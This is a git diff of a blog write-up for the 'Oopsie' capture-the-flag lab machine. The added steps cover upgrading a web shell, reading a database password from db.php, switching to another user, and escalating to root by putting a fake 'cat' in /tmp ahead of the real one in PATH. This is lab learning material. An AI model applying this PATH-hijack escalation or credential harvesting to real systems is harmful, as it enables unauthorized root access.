@@ -1,16 +1,25 @@
 ---
 title: "Writeup: Oopsie"
-date: 2020-12-29T9:34:30-04:00
+date: 2021-01-01T9:34:30-04:00
 categories:
   - Blog
-  - Notes
+  - Writeup
 tags:
   - oopsie
   - update
   - nmap
-  - pwd
+  - passwords
   - BURP
-  - dirsearch.py
+  - dirsearch
+  - webshell
+  - cat
+  - PATH
+  - export
+  - strings
+  - chmod
+  - upgrade shell
+  - id
+  - su
 ---
 
 Here are notes from the named target:
@@ -171,6 +180,25 @@ bin
 boot
 cdrom
 ```
+
+**UPGRADE SHELL**
+
+If you pop a shell from a web server you are most likely in as "www-data" and the shell is not good to use as a full featured one:
+
+Upgrafe shell with running these commands all at once:
+
+```yaml
+SHELL=/bin/bash script -q /dev/null
+Ctrl-Z
+stty raw -echo
+fg
+reset
+xterm
+```
+
+You may have to answer a question for termanal type so enter "xterm" and/or hit return several times until you get the proper shell:
+
+
 Grab local info
 ```yaml
 $ cd home
@@ -211,22 +239,123 @@ Shellcodes: No Results
 
 Check open ports that may not be visable from outside"
 
-netstat -antup - showm myswl port 3306 listening
+netstat -antup - showm myswl port 3306 listening - that tells me that there may be a SQL server.
 
-**UPGRADE SHELL**
-
-If you pop a shell from a web server you are most likely in as "www-data" and the shell is not good to use as a full featured one:
-
-Upgrafe shell with running these commands all at once:
+Looked to the web server root
 
 ```yaml
-SHELL=/bin/bash script -q /dev/null
-Ctrl-Z
-stty raw -echo
-fg
-reset
-xterm
+/var/www/html/cdn-cgi/login
 ```
 
-You may have to answer a question for termanal type so enter "xterm" and/or hit return several times 
+see a db.php file and do a cat of that file to see:
+
+```yaml
+cat db.php
+<?php
+$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
+?>
+```
+
+I saw the account "robert" earlier so want to check to see if he is in any groups that can do things so id robert and see he is part of a "bugtracker group" that could mean that there may be an application called bugtracker:
+```yaml
+id robert
+uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+```
+Use the locate command to find the bugtracker program but if "locate" does not work you can also use find command
+
+```yaml
+# locate bugtracker
+locate bugtracker
+/usr/bin/bugtracker
+
+# find / -type f -group bugtracker 2>/dev/null       
+find / -type f -group bugtracker 2>/dev/null
+/usr/bin/bugtracker
+```
+
+To run this application change to the robert account with the password found in the sql connection string with his password 'M3g4C0rpUs3r!':
+
+```yaml
+root@oopsie:/# su robert
+su robert
+robert@oopsie:/$ /usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 
+```
+The bug reports are being read from somewhere so we use the command strings to read out some details from inside the bugtracket program:
+
+```yaml
+robert@oopsie:/$ strings /usr/bin/bugtracker
+strings /usr/bin/bugtracker
+<snip>
+AWAVI
+AUATL
+[]A\A]A^A_
+------------------
+: EV Bug Tracker :
+------------------
+Provide Bug ID: 
+---------------
+cat /root/reports/
+;*3$"
+
+<snip>
+```
+
+It looks like the program calls "cat" to read reports that are in the root folder... therefore cat is running as root in this application.
+
+Put a bogus "cat" in the "/tmp" folder and add "/tmp" to the path will cause our "cat" too be read befor the real one. In this case we are just having "cat open a shell:
+
+```yaml
+export PATH=/tmp:$PATH
+cd /tmp/
+echo '/bin/sh' > cat
+chmod +x cat
+```
+
+this is the result after we change path to include /tmp and add a bogus cat then run bugtracker again:
+
+```yaml
+robert@oopsie:/$ export PATH=/tmp:$PATH
+cd /tmp/
+echo '/bin/sh' > cat
+chmod +x catexport PATH=/tmp:$PATH
+robert@oopsie:/$ cd /tmp/
+robert@oopsie:/tmp$ echo '/bin/sh' > cat
+chmod +x /tmp/cat
+
+robert@oopsie:/tmp$ /usr/bin/bugtracker
+/usr/bin/bugtracker
+
+------------------
+: EV Bug Tracker :
+------------------
+
+Provide Bug ID: 1
+1
+---------------
+
+# id
+id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+```
+
+Now as root we go to root folder and cat the flag file there "root.txt" 
+make sure you use the correct version of cat /bin/cat
+
+```yaml
+# id
+id
+uid=0(root) gid=1000(robert) groups=1000(robert),1001(bugtracker)
+# /bin/cat /root/root.txt
+/bin/cat /root/root.txt
+af13b0b#################
+# 
+```
+
 
